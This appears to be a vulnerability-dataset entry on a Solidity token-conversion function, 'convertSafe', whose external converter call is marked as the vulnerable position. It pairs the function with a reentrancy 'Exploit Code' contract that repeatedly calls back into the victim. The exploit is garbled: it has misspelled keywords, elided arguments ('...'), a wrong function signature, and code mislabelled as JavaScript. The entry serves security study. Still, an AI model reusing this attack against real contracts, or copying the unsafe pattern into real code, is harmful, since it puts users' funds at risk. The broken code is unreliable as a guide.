## Vulnerable Code

```javascript
**Instance_1**
 function convertSafe(
        TokenConverter converter,
        Token fromToken,
        Token toToken,
        uint256 amount
    ) internal returns (uint256 bought) {
        if (fromToken != ETH_ADDRESS) require(fromToken.approve(converter, amount));
        uint256 prevBalance = toToken != ETH_ADDRESS ? toToken.balanceOf(this) : address(this).balance;
        uint256 sendEth = fromToken == ETH_ADDRESS ? amount : 0;
        uint256 boughtAmount = converter.convert.value(sendEth)(fromToken, toToken, amount, 1); //Vulnerable position
        require(
            boughtAmount == (toToken != ETH_ADDRESS ? toToken.balanceOf(this) : address(this).balance) - prevBalance,
            "Bought amound does does not match"
        );
        if (fromToken != ETH_ADDRESS) require(fromToken.approve(converter, 0));
        return boughtAmount;
 }


**Instance_2**
    function convertSafe(
        TokenConverter converter,
        Token fromToken,
        Token toToken,
        uint256 amount
    ) internal returns (uint256 bought) {
        if (fromToken != ETH_ADDRESS) require(fromToken.approve(converter, amount), "Error approving token transfer");   //different code
        uint256 prevBalance = toToken != ETH_ADDRESS ? toToken.balanceOf(this) : address(this).balance;
        uint256 sendEth = fromToken == ETH_ADDRESS ? amount : 0;
        uint256 boughtAmount = converter.convert.value(sendEth)(fromToken, toToken, amount, 1);
        require(
            boughtAmount == (toToken != ETH_ADDRESS ? toToken.balanceOf(this) : address(this).balance) - prevBalance,
            "Bought amound does does not match"
        );
        if (fromToken != ETH_ADDRESS) require(fromToken.approve(converter, 0), "Error removing token approve");
        return boughtAmount;
    
```



## Exploit Code

```javascript
Contract TokenConverter {

}
Contract Attack is TokenConverter{
    uint count;
    address victimAddress;
    bytes  bs4 = new bytes(4);
    bytes4 functionSignature = bytes4(keccak256("startAttack()"));
    function setVictim(address  _victim){
        victimAddress = _victim;
    }
    funciton convert(Token fromToken, Token toToken, uint256 amount, uint256 a) payable{
        for (uint i = 0; i< bs4.length; i++){
            bs4[i] = functionSignature[i];
        }
        count++;
        if(count < 5){
            victimAddress.call(byte4(keccak256("convertSafe(TokenConverter , Token,  Token)")), TokenConverter(this),  ..., ...);
        }
    }
}
```



##  Sophisticated Vulnerability Description
Look at the row "vulnerability position".The variable 'converter' can be passed into any value by a malicious contract
